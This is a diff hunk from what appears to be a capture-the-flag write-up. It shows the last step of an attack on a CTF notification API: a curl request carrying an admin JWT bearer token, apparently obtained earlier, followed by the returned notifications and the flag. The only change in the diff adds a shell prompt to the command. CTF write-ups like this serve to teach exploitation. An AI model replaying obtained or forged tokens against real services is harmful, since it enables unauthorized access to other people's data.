@@ -66,7 +66,7 @@ To retrieve the flag you only need to request the notifications with the new adm
 ```bash
 $ export ACCESS=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzA4NzA5MDYsIm5iZiI6MTU3MDg3MDkwNiwianRpIjoiMGExOTA3MTktMTU2Yi00NzA2LWIwODEtMmE2Y2Q1YTFlY2ZmIiwiZXhwIjoxNjAyNDA2OTA2LCJpZGVudGl0eSI6MzYzLCJmcmVzaCI6ZmFsc2UsInR5cGUiOiJhY2Nlc3MifQ.zl8IJgILpDn2Z-kBUXsr2hk6qxoCpk-xbpqYNyz7JKs
 
-curl -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/"
+$ curl -H "Authorization: Bearer $ACCESS" -H "Content-Type: application/json" "https://notifyxapi.rootersctf.in/api/v1/notifications/"
 
 [{"body":"rooters{a_big_hard_business_in_a_big_hard_building}ctf","issuer":{"email":"admin@test.com","id":1},"id":1,"title":"flag"},{"body":"hey, rosssssss","issuer":{"email":"test@test.com","id":2},"id":2,"title":"The IT Crowd"},{"body":"Jen Barber? Is that the internet?","issuer":{"email":"test@test.com","id":2},"id":3,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":4,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":5,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":6,"title":"The IT Crowd"},{"body":"hey, rosssssss","issuer":{"email":"boss@test.com","id":14},"id":7,"title":"'"}]
 ```
